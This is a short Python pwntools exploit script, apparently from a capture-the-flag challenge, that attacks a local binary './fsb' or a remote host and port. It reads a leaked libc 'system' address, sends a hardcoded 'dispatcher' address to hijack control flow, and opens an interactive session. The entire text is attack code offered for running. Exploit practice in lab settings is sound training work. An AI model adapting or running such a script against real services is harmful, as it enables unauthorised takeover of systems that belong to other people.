#!/usr/bin/python
from pwn import *
import sys
# context.log_level = 'debug'

if len(sys.argv)>2:
    addr = sys.argv[1]
    port = int(sys.argv[2])
    p = remote(addr,port)
else:
    p = process('./fsb')

# some func leak libc
system = u64(p.recv(8))
log.info("system = " + hex(system))

dispatcher = 0x400657

# gdb.attach(p)

p.sendline(p64(dispatcher))
p.interactive()
